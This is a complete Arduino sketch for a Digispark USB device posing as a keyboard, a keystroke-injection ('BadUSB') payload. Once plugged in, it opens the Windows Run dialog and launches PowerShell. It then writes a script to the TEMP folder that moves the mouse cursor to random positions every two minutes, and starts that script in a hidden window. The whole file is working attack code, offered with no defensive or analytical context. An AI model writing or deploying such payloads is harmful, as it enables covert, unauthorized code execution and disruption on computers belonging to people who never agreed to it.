#include <DigiKeyboard.h>
#include <avr/pgmspace.h>

void ptype(const char* s){char c;while((c=pgm_read_byte(s++))){DigiKeyboard.print(c);delay(8);}}
void pln(const char* s){ptype(s);DigiKeyboard.sendKeyStroke(KEY_ENTER);DigiKeyboard.delay(50);}

void setup() {
  DigiKeyboard.delay(5000);
  DigiKeyboard.sendKeyStroke(0x15, MOD_GUI_LEFT); // Win+R
  DigiKeyboard.delay(800);
  ptype(PSTR("powershell"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
  pln(PSTR("'Add-Type -A System.Windows.Forms;while(1){sleep 120;[System.Windows.Forms.Cursor]::Position=New-Object System.Drawing.Point((Get-Random -Min 0 -Max 2560),(Get-Random -Min 0 -Max 1600))}' | Set-Content $env:TEMP\\j.ps1;Start-Process powershell -WindowStyle Hidden -ArgumentList \"-File\",$env:TEMP\\j.ps1;exit"));
}
void loop(){DigiKeyboard.delay(1);}
